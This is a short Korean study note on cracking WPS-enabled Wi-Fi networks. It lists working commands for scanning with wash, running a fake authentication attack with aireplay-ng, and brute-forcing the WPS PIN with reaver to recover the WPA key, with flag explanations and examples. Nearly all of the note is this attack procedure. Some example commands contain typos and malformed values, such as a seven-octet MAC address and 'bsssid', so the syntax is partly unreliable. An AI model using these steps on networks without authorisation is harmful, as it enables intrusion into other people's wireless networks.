# ti-study
25. 2. 18.
airodump-ng 말고 wps 기능 활성화 하에서는 다른 방법으로 네트워크르 확인해야 한다.
wash라는 도구를 이용
wash --interface mon0(모니터모드가 활성된 장비)
누르면 네트워크 목록이 나온다.
vendor에는 네트워크의 액세스 포인트의하드웨어 벤더(제조사) 정보가 나온다.
lck는 wps가 잠김 상태인지 아닌지 알려준다.
wps에는 wps의 버전 정보가 나온다.
dBM은 신호강도이다.
wpa나 wpa2 상관 없이 wpa 기능을 이용하면 해킹이 가능하다.
해킹이 실패한다면 pbc(푸시 버튼 인증)을 사용 중이기 때문이다.
우선 bssid에서 맥 주소를 카피해서 가짜 인증 공격으로 대상 네트워크와 결합한다.
aireplay-ng --fakeauth 30(이전에 0은 바로바로 결합이지만 30은 30초마다 결합) -a 00:11:22:33:44:55:66(대상맥주소) -h (무선네트워크 맥주소, ifconfig로 upsepc의 첫12자리, -를 :로 변경) mon0(무선어뎁터명 명시)
ex)aireplay-ng --fakeauth 30 -a 11:22:33:44:55 -h 48:52:32:11:22:33 -mon0
reaver는 pin을 이용한 무차별 대입공격, 맞는 비밀번호가 나올 때까지 계속 시도해서 성공하면 wpa키 값을 연산한다.
커맨드는
reaver --bssid 11:22:33:44:55:66:(대상네트워크 mac주소) --channel 1(대상 네트워크 채널 값) --interface mon0(모니터모드에 있는 무선어뎁터를 명시) -vvv(실패경우 등에 많은 정보를 알려줌.) --no-associate(reaver에게 결합은 하지말라는 것. reaver 자체 결합기능이 있으나 실패경우가 많다.)
ex)reaver --bsssid 11:22:33:44:55:66: --channel 1 --interface mon0 --vvv --no-associate
reaver 커맨드 입력 후 네트워크 결합 커맨드인 aireplay-ng 커맨드를 입력, 별도 결합을 시켜줘야한다.
wps pin에 나오는 값이 pin 값이다.
wpa psk에 나오는 값이 wpa의 키 값이다.
ap ssid에 나오는 것이 라우터 이름이다.



